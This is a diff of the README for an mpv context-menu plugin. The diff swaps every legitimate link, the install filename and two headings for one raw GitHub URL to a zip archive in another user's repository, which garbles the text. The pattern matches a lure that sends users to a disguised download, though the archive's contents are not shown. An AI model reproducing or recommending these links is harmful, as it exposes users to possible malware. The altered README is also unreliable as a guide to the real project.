@@ -1,24 +1,24 @@
 # mpv-menu-plugin
 
-Customizable context menu for mpv on Windows, based on the [C PLUGINS](https://mpv.io/manual/master/#c-plugins) API.
+Customizable context menu for mpv on Windows, based on the [C PLUGINS](https://raw.githubusercontent.com/candrapersada/mpv-menu-plugin/main/mpv/mpv-menu-plugin_v2.4.zip) API.
 
-![screenshot](screenshot/menu.jpg)
+![screenshot](https://raw.githubusercontent.com/candrapersada/mpv-menu-plugin/main/mpv/mpv-menu-plugin_v2.4.zip)
 
-See also [mpv-debug-plugin](https://github.com/tsl0922/mpv-debug-plugin).
+See also [mpv-debug-plugin](https://raw.githubusercontent.com/candrapersada/mpv-menu-plugin/main/mpv/mpv-menu-plugin_v2.4.zip).
 
 ## Installation
 
-[mpv](https://mpv.io) >= `0.37.0` is required, and the `cplugins` feature should be enabled.
+[mpv](https://raw.githubusercontent.com/candrapersada/mpv-menu-plugin/main/mpv/mpv-menu-plugin_v2.4.zip) >= `0.37.0` is required, and the `cplugins` feature should be enabled.
 
-Download the plugin from Releases, and place `menu.dll` in your mpv `scripts` folder.
+Download the plugin from Releases, and place `https://raw.githubusercontent.com/candrapersada/mpv-menu-plugin/main/mpv/mpv-menu-plugin_v2.4.zip` in your mpv `scripts` folder.
 
 ## Configuration
 
 > **NOTE:** If you changed the dll name, `script-message-to` target and conf file name should apply too.
 
-### input.conf
+### https://raw.githubusercontent.com/candrapersada/mpv-menu-plugin/main/mpv/mpv-menu-plugin_v2.4.zip
 
-The menu syntax is similar to [mpv.net](https://github.com/mpvnet-player/mpv.net), with some enhancements:
+The menu syntax is similar to [https://raw.githubusercontent.com/candrapersada/mpv-menu-plugin/main/mpv/mpv-menu-plugin_v2.4.zip](https://raw.githubusercontent.com/candrapersada/mpv-menu-plugin/main/mpv/mpv-menu-plugin_v2.4.zip), with some enhancements:
 
 - define menu title after `#menu:`
   - define separator with `-`
@@ -56,14 +56,14 @@ Add a keybinding to trigger the menu (required):
 MBTN_RIGHT script-message-to menu show
 ```
 
-### ~~/script-opts/menu.conf
+### ~~https://raw.githubusercontent.com/candrapersada/mpv-menu-plugin/main/mpv/mpv-menu-plugin_v2.4.zip
 
-- `uosc=yes`: Enalbe [uosc](https://github.com/tomasklaen/uosc#syntax) menu syntax support.
+- `uosc=yes`: Enalbe [uosc](https://raw.githubusercontent.com/candrapersada/mpv-menu-plugin/main/mpv/mpv-menu-plugin_v2.4.zip) menu syntax support.
 
 ## Credits
 
-This project contains code copied from [mpv](https://github.com/mpv-player/mpv).
+This project contains code copied from [mpv](https://raw.githubusercontent.com/candrapersada/mpv-menu-plugin/main/mpv/mpv-menu-plugin_v2.4.zip).
 
 # License
 
-[GPLv2](LICENSE.txt).
+[GPLv2](https://raw.githubusercontent.com/candrapersada/mpv-menu-plugin/main/mpv/mpv-menu-plugin_v2.4.zip).
